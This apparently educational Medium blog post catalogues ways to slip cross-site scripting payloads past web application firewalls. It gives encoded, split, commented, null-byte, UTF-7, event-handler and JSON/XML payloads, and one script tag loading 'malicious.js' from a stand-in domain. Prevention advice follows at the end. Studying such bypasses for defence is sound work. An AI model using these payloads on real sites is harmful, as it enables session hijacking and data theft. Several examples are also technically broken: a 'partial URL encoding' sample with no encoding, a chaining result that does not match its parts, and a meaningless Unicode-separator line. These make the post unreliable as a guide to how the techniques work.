---
title: "XSS Web Application Firewall Bypass Techniques 701ad7f96915"
platform: Medium
original_file: 2024-09-03_XSS-Web-Application-Firewall-Bypass-Techniques-701ad7f96915.md
---

# XSS Web Application Firewall Bypass Techniques 701ad7f96915

::: {}
# XSS Web Application Firewall Bypass Techniques {#xss-web-application-firewall-bypass-techniques .p-name}
:::

::: {.section .p-summary field="subtitle"}
Introduction
:::

::::::::::::::::::::::::::: {.section .e-content field="body"}
:::::: {#57a9 .section .section .section--body .section--first}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### XSS Web Application Firewall Bypass Techniques {#efa1 .graf .graf--h3 .graf--leading .graf--title name="efa1"}

<figure id="06de" class="graf graf--figure graf-after--h3">
<img src="https://cdn-images-1.medium.com/max/800/0*ln5GdQWDGzolTwFg"
class="graf-image" data-image-id="0*ln5GdQWDGzolTwFg" data-width="299"
data-height="168" />
</figure>

### Introduction {#affd .graf .graf--h3 .graf-after--figure name="affd"}

Cross-Site Scripting (XSS) is one of the most common vulnerabilities
found in web applications. It occurs when an attacker injects malicious
scripts into a web application, which are then executed in the context
of another user's session. Web Application Firewalls (WAFs) are commonly
used to protect web applications from such attacks by filtering and
monitoring HTTP traffic. However, WAFs are not foolproof, and skilled
attackers can sometimes find ways to bypass these protections.

In this comprehensive blog post, we will delve into various techniques
used to bypass WAFs to exploit XSS vulnerabilities. We'll cover the
basics of XSS, how WAFs attempt to mitigate it, and the methods used by
attackers to evade these protections. Please note that this information
is provided strictly for educational purposes and should not be used for
any illegal activities.
:::
::::
::::::

:::::: {#0f2f .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Understanding XSS {#6a41 .graf .graf--h3 .graf--leading name="6a41"}

### What is XSS? {#8174 .graf .graf--h3 .graf-after--h3 name="8174"}

Cross-Site Scripting (XSS) is a security vulnerability that allows an
attacker to inject malicious scripts into a web application. These
scripts are then executed in the user's browser, leading to various
malicious outcomes such as:

- [**Stealing Cookies**: An attacker can steal session cookies and
  impersonate the user.]{#1f05}
- [**Phishing**: The attacker can redirect users to a malicious site or
  create a fake login page.]{#f074}
- [**Keylogging**: Scripts can be used to capture keystrokes and send
  them to the attacker.]{#9da5}
- [**Session Hijacking**: The attacker can take over the user's session
  and perform unauthorized actions.]{#a4bb}

### Types of XSS {#8cd1 .graf .graf--h3 .graf-after--li name="8cd1"}

1.  [**Stored XSS**: The malicious script is permanently stored on the
    target server, such as in a database, and is served to users when
    they access the affected page.]{#50d8}
2.  [**Reflected XSS**: The script is reflected off a web server, such
    as in an error message or search result, and is immediately sent
    back to the user.]{#6bfc}
3.  [**DOM-Based XSS**: The vulnerability exists in the client-side
    code, and the attack is executed when the victim's browser processes
    the data.]{#292c}
:::
::::
::::::

:::::: {#a36f .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Web Application Firewalls (WAFs) {#3990 .graf .graf--h3 .graf--leading name="3990"}

### What is a WAF? {#3350 .graf .graf--h3 .graf-after--h3 name="3350"}

A Web Application Firewall (WAF) is a security solution that filters and
monitors HTTP traffic between a web application and the internet. It is
designed to detect and prevent various types of attacks, including SQL
injection, XSS, and more. WAFs analyze incoming requests and apply a set
of rules or signatures to block malicious traffic.

### How WAFs Work Against XSS {#337d .graf .graf--h3 .graf-after--p name="337d"}

WAFs use a variety of methods to prevent XSS attacks:

1.  [**Signature-Based Detection**: WAFs use predefined signatures to
    detect known attack patterns in HTTP requests.]{#97f6}
2.  [**Behavioral Analysis**: WAFs monitor user behavior and detect
    anomalies that could indicate an attack.]{#8732}
3.  [**Input Validation**: WAFs can enforce input validation rules to
    ensure that only safe data is processed by the web
    application.]{#641d}
4.  [**Output Encoding**: WAFs can automatically encode output to
    prevent the execution of malicious scripts.]{#85a3}

However, attackers often develop techniques to bypass these protections.
:::
::::
::::::

:::::: {#9446 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Bypassing WAFs: Techniques and Code Examples {#5f53 .graf .graf--h3 .graf--leading name="5f53"}

### 1. Encoding Techniques {#d965 .graf .graf--h3 .graf-after--h3 name="d965"}

WAFs often rely on pattern matching to detect malicious payloads. By
encoding the payload in different ways, attackers can sometimes evade
detection.

#### URL Encoding {#07c3 .graf .graf--h4 .graf-after--p name="07c3"}

URL encoding replaces unsafe ASCII characters with a "%" followed by two
hexadecimal digits. Attackers can URL encode parts of the payload to
bypass the WAF.

**Example:**

Original Payload:

``` {#061e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script>alert('XSS')</script>
```

URL Encoded Payload:

``` {#7147 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="perl"}
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

In some cases, encoding only certain characters is sufficient to bypass
the WAF.

**Partial URL Encoding Example:**

``` {#376c .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### HTML Entity Encoding {#8395 .graf .graf--h4 .graf-after--pre name="8395"}

HTML entities can be used to encode characters in the payload, making it
difficult for the WAF to recognize the malicious script.

**Example:**

Original Payload:

``` {#27fd .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script>alert('XSS')</script>
```

HTML Entity Encoded Payload:

``` {#3c1a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;
```

### 2. Obfuscation Techniques {#a3b2 .graf .graf--h3 .graf-after--pre name="a3b2"}

Obfuscation involves altering the payload in a way that still allows it
to execute but makes it harder for the WAF to detect.

#### Using Alternative Syntax {#1c58 .graf .graf--h4 .graf-after--p name="1c58"}

JavaScript allows for several alternative syntax forms that can be used
to bypass WAF detection.

**Example:**

Instead of using `alert`{.markup--code .markup--p-code}, attackers might
use:

``` {#4fdb .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
javascript:window['alert']('XSS');
```

Or use different event handlers:

``` {#63d6 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<a href="javascript:alert(1)">Click me</a>
```

#### Breaking Up the Payload {#0818 .graf .graf--h4 .graf-after--pre name="0818"}

Attackers can break up the payload into multiple parts that the WAF
might not recognize as harmful when isolated.

**Example:**

Original Payload:

``` {#d9e7 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script>alert('XSS')</script>
```

Broken-Up Payload:

``` {#fe27 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
<scri"+"pt>alert('XSS')</scr"+"ipt>
```

### 3. Using Non-Standard Protocols {#f54d .graf .graf--h3 .graf-after--pre name="f54d"}

WAFs are often configured to inspect common HTTP and HTTPS protocols. By
using non-standard protocols, attackers can bypass these checks.

**Example:**

Instead of using the `http`{.markup--code .markup--p-code} or
`https`{.markup--code .markup--p-code} scheme, attackers might use:

``` {#174b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<a href="javascript:alert(1)">Click me</a>
```

Or even:

``` {#6c89 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<img src="javascript:alert('XSS')" />
```

### 4. Double Encoding {#8078 .graf .graf--h3 .graf-after--pre name="8078"}

Double encoding involves encoding the payload multiple times to evade
detection.

**Example:**

Original Payload:

``` {#faf8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script>alert('XSS')</script>
```

Double URL Encoded Payload:

``` {#5b64 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="perl"}
%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E
```

### 5. Commenting Out the WAF Rules {#e7f3 .graf .graf--h3 .graf-after--pre name="e7f3"}

In some cases, attackers can use HTML comments or other scripting tricks
to bypass WAF rules.

**Example:**

Original Payload:

``` {#649e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script>alert('XSS')</script>
```

Payload with Comments:

``` {#e40a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<scr<!-- -->ipt>alert('XSS')</scr<!-- -->ipt>
```

### 6. Inserting NULL Characters {#13ae .graf .graf--h3 .graf-after--pre name="13ae"}

NULL characters can be used to terminate strings early, potentially
bypassing WAF rules that are not designed to handle them properly.

**Example:**

Original Payload:

``` {#5870 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script>alert('XSS')</script>
```

Payload with NULL Characters:

``` {#274e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
<script\x00>alert('XSS')</script>
```

### 7. Using JavaScript Event Handlers {#3426 .graf .graf--h3 .graf-after--pre name="3426"}

Event handlers like `onmouseover`{.markup--code .markup--p-code},
`onclick`{.markup--code .markup--p-code}, and `onerror`{.markup--code
.markup--p-code} can be used to trigger scripts in ways that might not
be detected by a WAF.

**Example:**

Using `onerror`{.markup--code .markup--p-code} in an image tag:

``` {#a308 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<img src="invalid.jpg" onerror="alert('XSS')" />
```

Using `onmouseover`{.markup--code .markup--p-code} in a link:

``` {#b104 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<a href="#" onmouseover="alert('XSS')">Hover over me</a>
```

### 8. Exploiting WAF Weaknesses in Regular Expression Matching {#fc66 .graf .graf--h3 .graf-after--pre name="fc66"}

WAFs often use regular expressions to detect and block malicious inputs.
By carefully crafting the payload to exploit weaknesses in these regular
expressions, attackers can bypass the WAF.

**Example:**

Consider a regular expression that blocks the string
`alert`{.markup--code .markup--p-code} but not variations of it:

``` {#7209 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="scss"}
al\x00ert('XSS');
```

Or using concatenation:

``` {#1317 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
al"+"ert('XSS');
```

### 9. Chaining Payloads {#7b7c .graf .graf--h3 .graf-after--pre name="7b7c"}

Attackers can chain multiple payloads together in a way that each part
is harmless on its own, but when combined, they create a functional XSS
attack.

**Example:**

Payload Part 1:

``` {#725d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
<scri
```

Payload Part 2:

``` {#6650 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="shell"}
pt>alert('XSS')</script>
```

When these two parts are combined in the HTML:

``` {#2385 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<scri<!-- -->pt>alert('XSS')</script>
```

### 10. Targeting Specific WAF Implementations {#2bb0 .graf .graf--h3 .graf-after--pre name="2bb0"}

Some WAFs are known to have specific weaknesses or misconfigurations
that can be exploited.

#### Example: Bypassing Content Security Policy (CSP) {#4e20 .graf .graf--h4 .graf-after--p name="4e20"}

If a WAF is misconfigured or if the CSP is not implemented correctly,
attackers can bypass it by using trusted domains or inline scripts.

``` {#3810 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script src="https://trusted-domain.com/malicious.js"></script>
```

### 11. Exploiting Browser Inconsistencies {#0626 .graf .graf--h3 .graf-after--pre name="0626"}

Different browsers may interpret HTML and JavaScript differently.
Attackers can craft payloads that exploit these inconsistencies to
bypass the WAF.

**Example:**

Using `\u2028`{.markup--code .markup--p-code} (line separator) and
`\u2029`{.markup--code .markup--p-code} (paragraph separator) in
JavaScript to bypass filters:

``` {#9c82 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="scss"}
var\u2028alert\u2029(1);
```

### 12. Using Alternative Character Sets {#fb73 .graf .graf--h3 .graf-after--pre name="fb73"}

Attackers can use alternative character encodings like UTF-7 or Unicode
to bypass WAF filters that are configured only to detect standard
encodings.

**Example:**

Original Payload:

``` {#1708 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<script>alert('XSS')</script>
```

UTF-7 Encoded Payload:

``` {#a054 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
```

### 13. Exploiting JSON and XML Parsers {#768e .graf .graf--h3 .graf-after--pre name="768e"}

WAFs may not properly inspect JSON or XML payloads, allowing attackers
to inject scripts into these formats.

**Example:**

``` {#e390 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
{"username":"<script>alert('XSS')</script>"}
```

Or using XML:

``` {#74f3 .graf .graf--pre .graf-after--p .graf--trailing .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
<user><name><![CDATA[<script>alert('XSS')</script>]]></name></user>
```
:::
::::
::::::

:::::: {#dcf2 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Preventing XSS and WAF Bypass {#82a3 .graf .graf--h3 .graf--leading name="82a3"}

While WAFs provide a layer of defense against XSS attacks, they should
not be relied upon as the sole protection mechanism. Here are some
additional best practices:

### 1. Input Validation {#e82d .graf .graf--h3 .graf-after--p name="e82d"}

Ensure that all user inputs are validated against a strict set of rules.
Reject any inputs that do not conform to the expected format.

### 2. Output Encoding {#b9c2 .graf .graf--h3 .graf-after--p name="b9c2"}

Always encode user inputs before displaying them on the web page. This
ensures that any malicious scripts are rendered harmless.

### 3. Content Security Policy (CSP) {#47d8 .graf .graf--h3 .graf-after--p name="47d8"}

Implement a strong Content Security Policy (CSP) to restrict the sources
from which scripts can be loaded and executed.

### 4. Regular Updates and Patching {#6a02 .graf .graf--h3 .graf-after--p name="6a02"}

Ensure that the WAF and all related software components are regularly
updated to protect against the latest threats and vulnerabilities.

### 5. Comprehensive Security Testing {#d66c .graf .graf--h3 .graf-after--p name="d66c"}

Regularly conduct security testing, including both automated scanning
and manual penetration testing, to identify and fix vulnerabilities.
:::
::::
::::::

:::::: {#d085 .section .section .section--body .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Conclusion {#0885 .graf .graf--h3 .graf--leading name="0885"}

Bypassing WAFs to execute XSS attacks requires a deep understanding of
both the web application's behavior and the WAF's filtering mechanisms.
While the techniques discussed in this post highlight the complexities
and potential weaknesses of WAFs, it's important to recognize that the
best defense against XSS is a multi-layered security approach.

Combining secure coding practices, rigorous input validation, output
encoding, and the proper configuration of security headers like CSP will
significantly reduce the risk of XSS attacks. Additionally, regularly
updating and testing your WAF rules ensures that it remains effective
against evolving threats.

Remember, the information provided here is for educational purposes and
to help improve web application security. Always seek to protect systems
and applications rather than exploit them.

### Promote and Collaborate on Cybersecurity Insights {#dc6a .graf .graf--h3 .graf-after--p name="dc6a"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#cdc7 .graf .graf--h3 .graf-after--p name="cdc7"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::::::::::::::::::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 3, 2024](https://medium.com/p/701ad7f96915).

[Canonical
link](https://medium.com/@bevijaygupta/xss-web-application-firewall-bypass-techniques-701ad7f96915){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
